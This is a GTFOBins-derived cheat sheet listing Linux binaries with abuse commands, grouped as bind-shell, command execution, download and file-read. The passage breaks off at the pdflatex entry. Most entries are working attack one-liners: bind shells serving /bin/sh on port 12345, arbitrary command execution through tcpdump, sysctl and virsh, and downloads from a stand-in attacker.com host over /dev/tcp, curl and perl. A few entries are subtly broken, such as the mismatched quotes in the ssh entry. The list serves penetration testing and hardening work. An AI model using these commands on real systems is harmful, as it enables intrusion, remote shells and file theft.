# Linux Binary Exploitation
> Source: GTFOBins | Entries: 478 | Platform: linux


## Index

- [bind-shell](#bind-shell)
- [command](#command)
- [download](#download)
- [file-read](#file-read)
- [file-write](#file-write)
- [inherit](#inherit)
- [library-load](#library-load)
- [privilege-escalation](#privilege-escalation)
- [reverse-shell](#reverse-shell)
- [shell](#shell)
- [Uncategorized](#uncategorized)
- [upload](#upload)


### bind-shell

#### gawk
Linux binary 'gawk' with exploitation functions: bind-shell, file-read, file-write, reverse-shell, shell
**Categories:** bind-shell, file-read, file-write, reverse-shell, shell
```
gawk 'BEGIN {
    s = "/inet/tcp/12345/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```

#### go
Linux binary 'go' with exploitation functions: bind-shell, file-read, file-write, reverse-shell, shell
**Categories:** bind-shell, file-read, file-write, reverse-shell, shell
```
echo -e 'package main\nimport (\n\t"os"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >/path/to/temp-file.go
go run /path/to/temp-file.go
```

#### lua
Linux binary 'lua' with exploitation functions: bind-shell, download, file-read, file-write, reverse-shell, shell, up...
**Categories:** bind-shell, download, file-read, file-write, reverse-shell, shell, upload
```
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",12345));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
```

#### nc
Linux binary 'nc' with exploitation functions: bind-shell, download, reverse-shell, upload
**Categories:** bind-shell, download, reverse-shell, upload
```
nc -l -p 12345 -e /bin/sh
```

#### node
Linux binary 'node' with exploitation functions: bind-shell, download, file-read, file-write, reverse-shell, shell, u...
**Categories:** bind-shell, download, file-read, file-write, reverse-shell, shell, upload
```
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(12345)'
```

#### socat
Linux binary 'socat' with exploitation functions: bind-shell, download, file-read, file-write, reverse-shell, shell,...
**Categories:** bind-shell, download, file-read, file-write, reverse-shell, shell, upload
```
socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

#### socket
Linux binary 'socket' with exploitation functions: bind-shell, reverse-shell
**Categories:** bind-shell, reverse-shell
```
socket -svp '/bin/sh -i' 12345
```

### command

#### acr
Linux binary 'acr' with exploitation functions: command
**Categories:** command
```
echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file
```

#### aria2c
Linux binary 'aria2c' with exploitation functions: command, download, file-read
**Categories:** command, download, file-read
```
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain
```

#### at
Linux binary 'at' with exploitation functions: command, shell
**Categories:** command, shell
```
echo /path/to/command | at now
```

#### crash
Linux binary 'crash' with exploitation functions: command, inherit
**Categories:** command, inherit
```
CRASHPAGER=/path/to/command crash -h
```

#### crontab
Linux binary 'crontab' with exploitation functions: command, inherit
**Categories:** command, inherit
```
crontab -e
```

#### dnf
Linux binary 'dnf' with exploitation functions: command
**Categories:** command
```
dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
```

#### dnsmasq
Linux binary 'dnsmasq' with exploitation functions: command
**Categories:** command
```
dnsmasq --conf-script='/path/to/command 1>&2'
```

#### fail2ban-client
Linux binary 'fail2ban-client' with exploitation functions: command
**Categories:** command
```
fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban /path/to/command
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x
```

#### fastfetch
Linux binary 'fastfetch' with exploitation functions: command, file-read, shell
**Categories:** command, file-read, shell
```
echo '{"modules":[{"type":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc
```

#### fzf
Linux binary 'fzf' with exploitation functions: command, shell
**Categories:** command, shell
```
fzf --listen=12345
```

#### less
Linux binary 'less' with exploitation functions: command, file-read, file-write, inherit, shell
**Categories:** command, file-read, file-write, inherit, shell
```
cp /path/to/command ~/.lessfilter
less /etc/hosts
```

#### m4
Linux binary 'm4' with exploitation functions: command, file-read, shell
**Categories:** command, file-read, shell
```
echo 'esyscmd(/path/to/command)' | m4
```

#### nohup
Linux binary 'nohup' with exploitation functions: command, shell
**Categories:** command, shell
```
nohup /path/to/command
cat nohup.out
```

#### opencode
Linux binary 'opencode' with exploitation functions: command, inherit
**Categories:** command, inherit
```
opencode
! /path/to/command
```

#### openvt
Linux binary 'openvt' with exploitation functions: command
**Categories:** command
```
openvt -- /path/to/command
```

#### php
Linux binary 'php' with exploitation functions: command, download, file-read, file-write, reverse-shell, shell, upload
**Categories:** command, download, file-read, file-write, reverse-shell, shell, upload
```
php -r 'echo shell_exec("/path/to/command");'
```

#### pkg
Linux binary 'pkg' with exploitation functions: command
**Categories:** command
```
pkg install -y --no-repo-update ./x-1.0.txz
```

#### procmail
Linux binary 'procmail' with exploitation functions: command
**Categories:** command
```
echo -e ':0\n| /path/to/command >/path/to/temp-file
procmail -m /path/to/temp-file
```

#### restic
Linux binary 'restic' with exploitation functions: command, shell, upload
**Categories:** command, shell, upload
```
RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
```

#### rpm
Linux binary 'rpm' with exploitation functions: command, inherit, shell
**Categories:** command, inherit, shell
```
rpm -ivh x-1.0-1.noarch.rpm
```

#### rsyslogd
Linux binary 'rsyslogd' with exploitation functions: command
**Categories:** command
```
cat >/path/to/temp-file <<EOF
module(load="imuxsock")
:msg, contains, "somerandomstring" ^/path/to/command
EOF

rsyslogd -f /path/to/temp-file
```

#### rustup
Linux binary 'rustup' with exploitation functions: command, shell
**Categories:** command, shell
```
mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
echo '/path/to/command' >/path/to/temp-dir/bin/rustc
chmod +x /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc
```

#### snap
Linux binary 'snap' with exploitation functions: command
**Categories:** command
```
snap install xxxx_1.0_all.snap --dangerous --devmode
```

#### sshfs
Linux binary 'sshfs' with exploitation functions: command, download, shell, upload
**Categories:** command, download, shell, upload
```
sshfs -o ssh_command=/path/to/command x: /path/to/dir/
```

#### sysctl
Linux binary 'sysctl' with exploitation functions: command, file-read
**Categories:** command, file-read
```
sysctl 'kernel.core_pattern=|/path/to/command'
```

#### systemd-run
Linux binary 'systemd-run' with exploitation functions: command, shell
**Categories:** command, shell
```
systemd-run /path/to/command
```

#### tcpdump
Linux binary 'tcpdump' with exploitation functions: command, file-write
**Categories:** command, file-write
```
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file
```

#### virsh
Linux binary 'virsh' with exploitation functions: command, file-write
**Categories:** command, file-write
```
cat >/path/to/temp-file.xml <<EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='/path/to/command'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-file.xml
virsh -c qemu:///system destroy x
```

#### yum
Linux binary 'yum' with exploitation functions: command, download, inherit
**Categories:** command, download, inherit
```
yum localinstall -y x-1.0-1.noarch.rpm
```

#### zic
Linux binary 'zic' with exploitation functions: command
**Categories:** command
```
echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file
```

### download

#### ab
Linux binary 'ab' with exploitation functions: download, upload
**Categories:** download, upload
```
ab -v2 http://attacker.com/path/to/input-file
```

#### bash
Linux binary 'bash' with exploitation functions: download, file-read, file-write, library-load, reverse-shell, shell,...
**Categories:** download, file-read, file-write, library-load, reverse-shell, shell, upload
```
bash -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
```

#### code
Linux binary 'code' with exploitation functions: download, reverse-shell, upload
**Categories:** download, reverse-shell, upload
```
code tunnel --name xxxxxx
```

#### curl
Linux binary 'curl' with exploitation functions: download, file-read, file-write, library-load, upload
**Categories:** download, file-read, file-write, library-load, upload
```
curl http://attacker.com/path/to/input-file -o /path/to/output-file
```

#### finger
Linux binary 'finger' with exploitation functions: download, upload
**Categories:** download, upload
```
finger x@attacker.com
```

#### ftp
Linux binary 'ftp' with exploitation functions: download, shell, upload
**Categories:** download, shell, upload
```
ftp -a attacker.com
get /path/to/input-file output-file
```

#### jjs
Linux binary 'jjs' with exploitation functions: download, file-read, file-write, reverse-shell, shell
**Categories:** download, file-read, file-write, reverse-shell, shell
```
jjs
var URL = Java.type('java.net.URL');
var ws = new URL('http://attacker.com/path/to/input-file');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('/path/to/output-file');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();
```

#### jrunscript
Linux binary 'jrunscript' with exploitation functions: download, file-read, file-write, reverse-shell, shell
**Categories:** download, file-read, file-write, reverse-shell, shell
```
jrunscript -e 'cp("http://attacker.com/path/to/input-file","/path/to/output-file")'
```

#### julia
Linux binary 'julia' with exploitation functions: download, file-read, file-write, reverse-shell, shell
**Categories:** download, file-read, file-write, reverse-shell, shell
```
julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
```

#### lwp-download
Linux binary 'lwp-download' with exploitation functions: download, file-read, file-write
**Categories:** download, file-read, file-write
```
lwp-download http://attacker.com/path/to/input-file /path/to/output-file
```

#### nginx
Linux binary 'nginx' with exploitation functions: download, library-load, upload
**Categories:** download, library-load, upload
```
cat >/path/to/temp-file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /path/to/temp-file
```

#### openssl
Linux binary 'openssl' with exploitation functions: download, file-read, file-write, library-load, reverse-shell, upload
**Categories:** download, file-read, file-write, library-load, reverse-shell, upload
```
openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
```

#### perl
Linux binary 'perl' with exploitation functions: download, file-read, reverse-shell, shell, upload
**Categories:** download, file-read, reverse-shell, shell, upload
```
perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp") or die; print $s "GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'
```

#### python
Linux binary 'python' with exploitation functions: download, file-read, file-write, library-load, reverse-shell, shel...
**Categories:** download, file-read, file-write, library-load, reverse-shell, shell, upload
```
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'
```

#### ruby
Linux binary 'ruby' with exploitation functions: download, file-read, file-write, library-load, reverse-shell, shell,...
**Categories:** download, file-read, file-write, library-load, reverse-shell, shell, upload
```
ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")'
```

#### scp
Linux binary 'scp' with exploitation functions: download, shell, upload
**Categories:** download, shell, upload
```
scp user@attacker.com:/path/to/input-file /path/to/output-file
```

#### sftp
Linux binary 'sftp' with exploitation functions: download, shell, upload
**Categories:** download, shell, upload
```
sftp user@attacker.com
get /path/to/input-file /path/to/output-file
```

#### smbclient
Linux binary 'smbclient' with exploitation functions: download, shell, upload
**Categories:** download, shell, upload
```
smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
```

#### ssh
Linux binary 'ssh' with exploitation functions: download, file-read, shell, upload
**Categories:** download, file-read, shell, upload
```
ssh user@attacker.com 'cat /path/to/input-file"
```

#### tar
Linux binary 'tar' with exploitation functions: download, file-read, file-write, shell, upload
**Categories:** download, file-read, file-write, shell, upload
```
tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
```

#### tftp
Linux binary 'tftp' with exploitation functions: download, upload
**Categories:** download, upload
```
tftp attacker.com
get /path/to/input-file
```

#### wget
Linux binary 'wget' with exploitation functions: download, file-read, file-write, shell, upload
**Categories:** download, file-read, file-write, shell, upload
```
wget http://attacker.com/path/to/input-file -O /path/to/output-file
```

#### whois
Linux binary 'whois' with exploitation functions: download, upload
**Categories:** download, upload
```
whois -h attacker.com -p 12345 x
```

#### zsh
Linux binary 'zsh' with exploitation functions: download, file-read, file-write, inherit, reverse-shell, shell, upload
**Categories:** download, file-read, file-write, inherit, reverse-shell, shell, upload
```
zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)" >/path/to/output-file'
```

### file-read

#### 7z
Linux binary '7z' with exploitation functions: file-read
**Categories:** file-read
```
7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so
```

#### alpine
Linux binary 'alpine' with exploitation functions: file-read
**Categories:** file-read
```
alpine -F /path/to/input-file
```

#### apache2
Linux binary 'apache2' with exploitation functions: file-read
**Categories:** file-read
```
apache2 -f /path/to/input-file
```

#### apache2ctl
Linux binary 'apache2ctl' with exploitation functions: file-read
**Categories:** file-read
```
apache2ctl -c 'Include /path/to/input-file'
```

#### ar
Linux binary 'ar' with exploitation functions: file-read
**Categories:** file-read
```
ar r /path/to/output-file /path/to/input-file
ar p /path/to/output-file
```

#### arj
Linux binary 'arj' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
arj a /path/to/output-file /path/to/input-file
arj p /path/to/output-file
```

#### arp
Linux binary 'arp' with exploitation functions: file-read
**Categories:** file-read
```
arp -v -f /path/to/input-file
```

#### as
Linux binary 'as' with exploitation functions: file-read
**Categories:** file-read
```
as @/path/to/input-file
```

#### ascii-xfr
Linux binary 'ascii-xfr' with exploitation functions: file-read
**Categories:** file-read
```
ascii-xfr -ns /path/to/input-file
```

#### ascii85
Linux binary 'ascii85' with exploitation functions: file-read
**Categories:** file-read
```
ascii85 /path/to/input-file | ascii85 --decode
```

#### aspell
Linux binary 'aspell' with exploitation functions: file-read
**Categories:** file-read
```
aspell -c /path/to/input-file
```

#### atobm
Linux binary 'atobm' with exploitation functions: file-read
**Categories:** file-read
```
atobm /path/to/input-file
```

#### aws
Linux binary 'aws' with exploitation functions: file-read, inherit
**Categories:** file-read, inherit
```
aws ec2 describe-instances --filter file:///path/to/input-file
```

#### base32
Linux binary 'base32' with exploitation functions: file-read
**Categories:** file-read
```
base32 /path/to/input-file | base32 --decode
```

#### base58
Linux binary 'base58' with exploitation functions: file-read
**Categories:** file-read
```
base58 /path/to/input-file | base58 --decode
```

#### base64
Linux binary 'base64' with exploitation functions: file-read
**Categories:** file-read
```
base64 /path/to/input-file | base64 --decode
```

#### basenc
Linux binary 'basenc' with exploitation functions: file-read
**Categories:** file-read
```
basenc --base64 /path/to/input-file | basenc -d --base64
```

#### basez
Linux binary 'basez' with exploitation functions: file-read
**Categories:** file-read
```
basez /path/to/input-file | basez --decode
```

#### bbot
Linux binary 'bbot' with exploitation functions: file-read
**Categories:** file-read
```
bbot -d -cy /path/to/input-file
```

#### bc
Linux binary 'bc' with exploitation functions: file-read
**Categories:** file-read
```
bc -s /path/to/input-file
quit
```

#### bconsole
Linux binary 'bconsole' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
bconsole -c /path/to/file-input
```

#### bridge
Linux binary 'bridge' with exploitation functions: file-read
**Categories:** file-read
```
bridge -b /path/to/input-file
```

#### bzip2
Linux binary 'bzip2' with exploitation functions: file-read
**Categories:** file-read
```
bzip2 -c /path/to/input-file | bzip2 -d
```

#### cat
Linux binary 'cat' with exploitation functions: file-read
**Categories:** file-read
```
cat /path/to/input-file
```

#### check_cups
Linux binary 'check_cups' with exploitation functions: file-read
**Categories:** file-read
```
check_cups --extra-opts=@/path/to/input-file
```

#### check_log
Linux binary 'check_log' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
check_log -F /path/to/input-file -O /dev/stdout
```

#### check_memory
Linux binary 'check_memory' with exploitation functions: file-read
**Categories:** file-read
```
check_memory --extra-opts=@/path/to/input-file
```

#### check_raid
Linux binary 'check_raid' with exploitation functions: file-read
**Categories:** file-read
```
check_raid --extra-opts=@/path/to/input-file
```

#### check_statusfile
Linux binary 'check_statusfile' with exploitation functions: file-read
**Categories:** file-read
```
check_statusfile /path/to/input-file
```

#### clamscan
Linux binary 'clamscan' with exploitation functions: file-read
**Categories:** file-read
```
touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
```

#### cmake
Linux binary 'cmake' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
cmake -E cat /path/to/input-file
```

#### cmp
Linux binary 'cmp' with exploitation functions: file-read
**Categories:** file-read
```
cmp /path/to/input-file /dev/zero -b -l
```

#### column
Linux binary 'column' with exploitation functions: file-read
**Categories:** file-read
```
column /path/to/input-file
```

#### comm
Linux binary 'comm' with exploitation functions: file-read
**Categories:** file-read
```
comm /path/to/input-file /dev/null
```

#### cp
Linux binary 'cp' with exploitation functions: file-read, file-write, privilege-escalation
**Categories:** file-read, file-write, privilege-escalation
```
cp /path/to/input-file /dev/stdout
```

#### cpio
Linux binary 'cpio' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
echo /path/to/input-file | cpio -o
```

#### csplit
Linux binary 'csplit' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
csplit /path/to/input-file 1
cat xx01
```

#### csvtool
Linux binary 'csvtool' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
csvtool trim t /path/to/input-file
```

#### cupsfilter
Linux binary 'cupsfilter' with exploitation functions: file-read
**Categories:** file-read
```
cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file
```

#### cut
Linux binary 'cut' with exploitation functions: file-read
**Categories:** file-read
```
cut -d '' -f1 /path/to/input-file
```

#### date
Linux binary 'date' with exploitation functions: file-read
**Categories:** file-read
```
date -f /path/to/input-file
```

#### dd
Linux binary 'dd' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
dd if=/path/to/input-file
```

#### dialog
Linux binary 'dialog' with exploitation functions: file-read
**Categories:** file-read
```
dialog --textbox /path/to/input-file 0 0
```

#### diff
Linux binary 'diff' with exploitation functions: file-read
**Categories:** file-read
```
diff --line-format=%L /dev/null /path/to/input-file
```

#### dig
Linux binary 'dig' with exploitation functions: file-read
**Categories:** file-read
```
dig -f /path/to/input-file
```

#### dmesg
Linux binary 'dmesg' with exploitation functions: file-read, inherit
**Categories:** file-read, inherit
```
dmesg -rF /path/to/input-file
```

#### docker
Linux binary 'docker' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
docker cp /path/to/input-file $CONTAINER_ID:input-file
docker cp $CONTAINER_ID:input-file /path/to/temp-file
cat /path/to/temp-file
```

#### dos2unix
Linux binary 'dos2unix' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
dos2unix -f -O /path/to/input-file
```

#### dosbox
Linux binary 'dosbox' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
dosbox -c 'mount c /' -c 'type c:\path\to\input'
```

#### dotnet
Linux binary 'dotnet' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
dotnet fsi
System.IO.File.ReadAllText("/path/to/input-file");;
```

#### ed
Linux binary 'ed' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
ed /path/to/input-file
,p
q
```

#### efax
Linux binary 'efax' with exploitation functions: file-read
**Categories:** file-read
```
efax -d /path/to/input-file
```

#### egrep
Linux binary 'egrep' with exploitation functions: file-read
**Categories:** file-read
```
grep '' /path/to/input-file
```

#### elvish
Linux binary 'elvish' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
elvish -c 'print (slurp </path/to/input-file)'
```

#### emacs
Linux binary 'emacs' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
emacs /path/to/input-file
```

#### eqn
Linux binary 'eqn' with exploitation functions: file-read
**Categories:** file-read
```
eqn /path/to/input-file
```

#### espeak
Linux binary 'espeak' with exploitation functions: file-read
**Categories:** file-read
```
espeak -qXf /path/to/input-file
```

#### exiftool
Linux binary 'exiftool' with exploitation functions: file-read, file-write, inherit
**Categories:** file-read, file-write, inherit
```
exiftool -filename=/path/to/output-file /path/to/input-file
cat /path/to/output-file
```

#### expand
Linux binary 'expand' with exploitation functions: file-read
**Categories:** file-read
```
expand /path/to/input-file
```

#### expect
Linux binary 'expect' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
expect /path/to/input-file
```

#### fgrep
Linux binary 'fgrep' with exploitation functions: file-read
**Categories:** file-read
```
grep '' /path/to/input-file
```

#### file
Linux binary 'file' with exploitation functions: file-read
**Categories:** file-read
```
file -f /path/to/input-file
```

#### find
Linux binary 'find' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
find /path/to/input-file -exec cat {} \;
```

#### fmt
Linux binary 'fmt' with exploitation functions: file-read
**Categories:** file-read
```
fmt -pNON_EXISTING_PREFIX /path/to/input-file
```

#### fold
Linux binary 'fold' with exploitation functions: file-read
**Categories:** file-read
```
fold -w999 /path/to/input-file
```

#### fping
Linux binary 'fping' with exploitation functions: file-read
**Categories:** file-read
```
fping -f /path/to/input-file
```

#### gcc
Linux binary 'gcc' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
gcc -x c -E /path/to/input-file
```

#### gcore
Linux binary 'gcore' with exploitation functions: file-read
**Categories:** file-read
```
gcore $PID
```

#### genisoimage
Linux binary 'genisoimage' with exploitation functions: file-read
**Categories:** file-read
```
genisoimage -q -o - /path/to/input-file
```

#### git
Linux binary 'git' with exploitation functions: file-read, file-write, inherit, shell
**Categories:** file-read, file-write, inherit, shell
```
git diff /dev/null /path/to/input-file
```

#### grep
Linux binary 'grep' with exploitation functions: file-read
**Categories:** file-read
```
grep '' /path/to/input-file
```

#### gzip
Linux binary 'gzip' with exploitation functions: file-read
**Categories:** file-read
```
gzip -c /path/to/input-file | gzip -d
```

#### head
Linux binary 'head' with exploitation functions: file-read
**Categories:** file-read
```
head -c-0 /path/to/input-file
```

#### hexdump
Linux binary 'hexdump' with exploitation functions: file-read
**Categories:** file-read
```
hd /path/to/input-file
```

#### highlight
Linux binary 'highlight' with exploitation functions: file-read
**Categories:** file-read
```
highlight --no-doc --failsafe /path/to/input-file
```

#### iconv
Linux binary 'iconv' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
iconv -f 8859_1 -t 8859_1 /path/to/input-file
```

#### ip
Linux binary 'ip' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
ip -force -batch /path/to/input-file
```

#### join
Linux binary 'join' with exploitation functions: file-read
**Categories:** file-read
```
join -a 2 /dev/null /path/to/input-file
```

#### jq
Linux binary 'jq' with exploitation functions: file-read
**Categories:** file-read
```
jq -Rr . /path/to/input-file
```

#### jshell
Linux binary 'jshell' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
jshell
jshell> /open /path/to/input-file
```

#### ksshell
Linux binary 'ksshell' with exploitation functions: file-read
**Categories:** file-read
```
ksshell -i /path/to/input-file
```

#### last
Linux binary 'last' with exploitation functions: file-read
**Categories:** file-read
```
last -a -f /path/to/input-file
```

#### latex
Linux binary 'latex' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
strings texput.dvi
```

#### latexmk
Linux binary 'latexmk' with exploitation functions: file-read, inherit, shell
**Categories:** file-read, inherit, shell
```
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
latexmk -dvi /path/to/temp-file
strings temp-file.dvi
```

#### links
Linux binary 'links' with exploitation functions: file-read
**Categories:** file-read
```
links /path/to/input-file
```

#### logrotate
Linux binary 'logrotate' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
logrotate /path/to/input-file
```

#### look
Linux binary 'look' with exploitation functions: file-read
**Categories:** file-read
```
look '' /path/to/input-file
```

#### ltrace
Linux binary 'ltrace' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
ltrace -F /path/to/input-file /dev/null
```

#### lwp-request
Linux binary 'lwp-request' with exploitation functions: file-read
**Categories:** file-read
```
lwp-request file:///path/to/input-file
```

#### make
Linux binary 'make' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
```

#### man
Linux binary 'man' with exploitation functions: file-read, inherit, shell
**Categories:** file-read, inherit, shell
```
man /path/to/input-file
```

#### mawk
Linux binary 'mawk' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
mawk '//' /path/to/input-file
```

#### more
Linux binary 'more' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
more /path/to/input-file
```

#### mosquitto
Linux binary 'mosquitto' with exploitation functions: file-read
**Categories:** file-read
```
mosquitto -c /path/to/input-file
```

#### msgattrib
Linux binary 'msgattrib' with exploitation functions: file-read
**Categories:** file-read
```
msgattrib -P /path/to/input-file
```

#### msgcat
Linux binary 'msgcat' with exploitation functions: file-read
**Categories:** file-read
```
msgcat -P /path/to/input-file
```

#### msgconv
Linux binary 'msgconv' with exploitation functions: file-read
**Categories:** file-read
```
msgconv -P /path/to/input-file
```

#### msgfilter
Linux binary 'msgfilter' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
msgfilter -P -i /path/to/input-file /bin/cat
```

#### msgmerge
Linux binary 'msgmerge' with exploitation functions: file-read
**Categories:** file-read
```
msgmerge -P /path/to/input-file /dev/null
```

#### msguniq
Linux binary 'msguniq' with exploitation functions: file-read
**Categories:** file-read
```
msguniq -P /path/to/input-file
```

#### mtr
Linux binary 'mtr' with exploitation functions: file-read
**Categories:** file-read
```
mtr --raw -F /path/to/input-file
```

#### mutt
Linux binary 'mutt' with exploitation functions: file-read
**Categories:** file-read
```
mutt -F /path/to/input-file
```

#### mypy
Linux binary 'mypy' with exploitation functions: file-read, file-write
**Categories:** file-read, file-write
```
mypy /path/to/input-file
```

#### nano
Linux binary 'nano' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
nano /path/to/input-file
```

#### nasm
Linux binary 'nasm' with exploitation functions: file-read
**Categories:** file-read
```
nasm -@ /path/to/input-file
```

#### neofetch
Linux binary 'neofetch' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
neofetch --ascii /path/to/input-file
```

#### nft
Linux binary 'nft' with exploitation functions: file-read
**Categories:** file-read
```
nft -f /path/to/input-file
```

#### nl
Linux binary 'nl' with exploitation functions: file-read
**Categories:** file-read
```
nl -bn -w1 -s '' /path/to/input-file
```

#### nm
Linux binary 'nm' with exploitation functions: file-read
**Categories:** file-read
```
nm /path/to/input-file
```

#### nmap
Linux binary 'nmap' with exploitation functions: file-read, file-write, inherit, shell
**Categories:** file-read, file-write, inherit, shell
```
nmap -iL /path/to/input-file
```

#### nroff
Linux binary 'nroff' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
nroff /path/to/input-file
```

#### ntpdate
Linux binary 'ntpdate' with exploitation functions: file-read
**Categories:** file-read
```
ntpdate -a x -k /path/to/input-file -d localhost
```

#### octave
Linux binary 'octave' with exploitation functions: file-read, file-write, shell
**Categories:** file-read, file-write, shell
```
octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
```

#### od
Linux binary 'od' with exploitation functions: file-read
**Categories:** file-read
```
od -An -c -w999 /path/to/input-file
```

#### openvpn
Linux binary 'openvpn' with exploitation functions: file-read, shell
**Categories:** file-read, shell
```
openvpn --config /path/to/input-file
```

#### pandoc
Linux binary 'pandoc' with exploitation functions: file-read, file-write, inherit
**Categories:** file-read, file-write, inherit
```
pandoc -t plain /path/to/input-file
```

#### paste
Linux binary 'paste' with exploitation functions: file-read
**Categories:** file-read
```
paste /path/to/input-file
```

#### pax
Linux binary 'pax' with exploitation functions: file-read
**Categories:** file-read
```
pax -w /path/to/input-file | tar -xO
```

#### pdflatex
